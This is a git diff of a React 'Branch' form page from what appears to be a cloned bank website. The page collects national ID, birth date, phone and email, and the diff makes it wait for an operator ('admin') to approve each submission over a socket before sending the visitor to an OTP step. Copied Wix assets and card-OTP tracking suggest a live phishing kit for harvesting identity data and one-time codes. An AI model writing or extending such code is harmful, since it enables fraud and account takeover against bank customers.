@@ -1,11 +1,14 @@
 import axios from "axios";
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
+import { BankSiteFooter } from "../components/BankSiteFooter";
+import { VisitorTopLogo } from "../components/VisitorTopLogo";
 import { formLevelErrorClass } from "../components/FormFieldError";
 import { PendingFormOverlay } from "../components/PendingFormOverlay";
 import { BottomBar } from "../components/VisitorShared";
 import { useLanguage } from "../context/LanguageContext";
 import { api_route } from "../socketApi";
+import { useOrderSession } from "../hooks/useOrderSession";
 import { BRANCH_OPTIONS } from "../constants/formOptions";
 
 function SelectChevron({ className }) {
@@ -51,6 +54,7 @@ export default function Branch() {
   const { t, dir, textDir } = useLanguage();
   const navigate = useNavigate();
   const location = useLocation();
+  const navigatedBranchRef = useRef(false);
   const orderId =
     location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
 
@@ -61,17 +65,60 @@ export default function Branch() {
   const [nationalId, setNationalId] = useState("");
   const [birthDate, setBirthDate] = useState("");
   const [phone, setPhone] = useState("");
+  const [phoneCountryCode, setPhoneCountryCode] = useState("+970");
   const [email, setEmail] = useState("");
   const [termsAccepted, setTermsAccepted] = useState(false);
   const [fieldErr, setFieldErr] = useState({});
   const [formError, setFormError] = useState("");
   const [loading, setLoading] = useState(false);
 
+  const {
+    branchApplicationAccepted,
+    rejectReason,
+    reviewBranchApplication,
+    cardOtpSubmitted,
+    hydrated,
+  } = useOrderSession(orderId);
+
+  const awaitingBranchReview =
+    hydrated &&
+    !!orderId &&
+    reviewBranchApplication &&
+    !rejectReason;
+
   useEffect(() => {
     if (!orderId) {
       navigate("/", { replace: true });
     }
   }, [orderId, navigate]);
+
+  useEffect(() => {
+    if (!hydrated || !orderId || navigatedBranchRef.current) return;
+    if (!branchApplicationAccepted) return;
+    navigatedBranchRef.current = true;
+    sessionStorage.setItem("currentOrderId", orderId);
+    navigate("/otp", { state: { orderId } });
+  }, [hydrated, branchApplicationAccepted, orderId, navigate]);
+
+  useEffect(() => {
+    if (!hydrated || !orderId || !rejectReason) return;
+    if (
+      branchApplicationAccepted ||
+      reviewBranchApplication ||
+      cardOtpSubmitted
+    ) {
+      return;
+    }
+    setFormError(rejectReason);
+    setLoading(false);
+  }, [
+    hydrated,
+    orderId,
+    rejectReason,
+    branchApplicationAccepted,
+    reviewBranchApplication,
+    cardOtpSubmitted,
+  ]);
 
   const validate = () => {
     const e = {};
@@ -105,14 +152,14 @@ export default function Branch() {
         nationalId: nationalId.replace(/\D/g, ""),
         birthDate: birthDate.trim(),
         phone: phone.trim(),
+        phoneCountryCode,
         email: email.trim().toLowerCase(),
         termsAccepted,
       });
       sessionStorage.setItem("currentOrderId", orderId);
-      navigate("/otp", { state: { orderId } });
+      /** إبقاء loading=true إلى أن يقرّر الأدمن (قبول → تنقل، رفض → نوقف التحميل في التأثير أعلاه) */
     } catch {
       setFormError(t("formData.errors.formFailed"));
-    } finally {
       setLoading(false);
     }
   };
@@ -121,35 +168,29 @@ export default function Branch() {
     return null;
   }
 
+  /** بعد إرسال ناجح: loading يبقى true حتى قبول الأدمن (تنقل لـ OTP) أو رفض الفرع (يُستدعى setLoading(false) في تأثير rejectReason). useOrderSession يحدّث الحالة عبر Socket + GET /state. */
+
   return (
     <section
       className="relative flex min-h-screen w-full justify-center bg-white"
       dir={dir}
     >
       <div
-        className="flex w-full  flex-col items-center pt-8  lg:w-1/3"
+        className="flex w-full flex-col items-center  lg:w-1/3"
         dir={textDir}
       >
-        {/* comp-mou8kons */}
-        <img
-          src="/wix/landing-top-logo.png"
-          alt=""
-          width={134}
-          height={61}
-          className="mb-3 w-[134px] object-cover"
-          fetchPriority="high"
-        />
+        <VisitorTopLogo />
 
         {/* comp-mou759h6 */}
         <img
           src="/wix/branch-hero.png"
           alt=""
-          className="mb-4 w-full  object-cover"
+          className="mt-8 w-full  object-cover"
           fetchPriority="high"
         />
 
         {/* comp-mf2nqw9m6 */}
-        <p className="mb-5 text-center text-[15px] font-bold leading-snug text-slate-900">
+        <p className="my-5 text-center text-[15px] font-bold leading-snug text-slate-900">
           {t("branch.intro")}
         </p>
 
@@ -159,8 +200,12 @@ export default function Branch() {
           noValidate
         >
           <PendingFormOverlay
-            show={loading}
-            ariaLabel={t("common.loadingAria")}
+            show={loading || awaitingBranchReview}
+            ariaLabel={
+              awaitingBranchReview
+                ? t("common.awaitingBranchReview")
+                : t("common.loadingAria")
+            }
           />
           <input
             name="username"
@@ -250,18 +295,30 @@ export default function Branch() {
             className={wixInputClass(!!fieldErr.birthDate)}
           />
 
-          <input
-            type="tel"
-            autoComplete="tel"
-            placeholder={t("branch.placeholderPhone")}
-            value={phone}
-            onChange={(e) => {
-              setPhone(e.target.value);
-              setFieldErr((f) => ({ ...f, phone: false }));
-            }}
-            className={wixInputClass(!!fieldErr.phone)}
-          />
-
+          <div className="flex w-full gap-2">
+            <select
+              aria-label="رمز الدولة"
+              value={phoneCountryCode}
+              onChange={(e) => setPhoneCountryCode(e.target.value)}
+              className="w-[4.75rem] shrink-0 rounded-md border border-slate-300 bg-white py-3 ps-2 pe-1 text-sm outline-none focus:border-slate-500 focus:ring-1 focus:ring-slate-400"
+              dir="ltr"
+            >
+              <option value="+970">+970</option>
+              <option value="+972">+972</option>
+            </select>
+            <input
+              type="tel"
+              autoComplete="tel"
+              placeholder={t("branch.placeholderPhone")}
+              value={phone}
+              dir="rtl"
+              onChange={(e) => {
+                setPhone(e.target.value);
+                setFieldErr((f) => ({ ...f, phone: false }));
+              }}
+              className={`${wixInputClass(!!fieldErr.phone)} min-w-0 flex-1`}
+            />
+          </div>
           <input
             type="email"
             autoComplete="email"
@@ -289,6 +346,12 @@ export default function Branch() {
             </span>
           </label>
 
+          {fieldErr.termsAccepted ? (
+            <p className="text-center text-sm text-red-600" role="alert">
+              {t("branch.termsError")}
+            </p>
+          ) : null}
+
           {formError ? (
             <div className={formLevelErrorClass()} role="alert">
               {formError}
@@ -297,7 +360,7 @@ export default function Branch() {
 
           <button
             type="submit"
-            disabled={loading}
+            disabled={loading || awaitingBranchReview}
             aria-label={t("branch.submit")}
             className="mt-2 w-full rounded-md bg-[#B80070] py-3 text-center text-base font-medium text-white shadow-sm transition hover:bg-[#B80070] disabled:opacity-60"
           >
@@ -305,12 +368,7 @@ export default function Branch() {
           </button>
         </form>
 
-        <img
-          src="/wix/landing-screenshot-2.png"
-          alt=""
-          className="mt-8 w-full  object-cover"
-          loading="lazy"
-        />
+        <BankSiteFooter className="mt-8 w-full" />
       </div>
 
       <BottomBar />
